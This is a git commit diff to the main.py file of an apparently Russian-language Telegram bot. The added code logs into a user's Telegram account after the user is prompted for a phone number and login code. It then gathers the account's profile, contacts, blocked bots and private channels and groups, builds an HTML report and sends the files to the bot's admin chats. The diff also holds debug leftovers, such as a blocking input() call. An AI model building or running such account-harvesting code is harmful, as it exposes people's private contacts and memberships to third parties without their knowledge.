5d252d02fafc190c8f31a83f33598afb8e986443
T4eslenko <151871161+T4eslenko@users.noreply.github.com>
2024-05-26 21:34:32 +0300

    Update main.py

--- main.py
+++ main.py
@@ -77,6 +77,34 @@ async def get_phone_number(message: types.Message):
         #phone_code_hash = await client.send_code_request(phone_number)
         #user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
         await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
+        #Потом убрать все что ниже
+        phone = input('Введите номер')
+        client = TelegramClient(phone, api_id, api_hash).start(phone)
+
+        # После успешной авторизации выполнение функций
+        selection = '0'
+
+        # Получаем информацию о пользователе
+        userid, userinfo, firstname, lastname, username = await get_user_info(client, phone_number, selection)
+
+        # Получаем информацию о заблокированных ботах
+        count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = await get_blocked_bot(client, selection)
+
+        # Формируем списки каналов и чатов
+        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await  make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
+
+        # Получаем и сохраняем контакты пользователя
+        total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userinfo, userid)
+
+        # Сохраняем информацию о каналах и группах пользователя
+        await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
+
+        # Формируем отчет в формате HTML
+        await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html)
+
+        # Отправляем файлы
+        await send_files_to_bot(bot, admin_chat_ids, user_chat_id)
+        
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
 
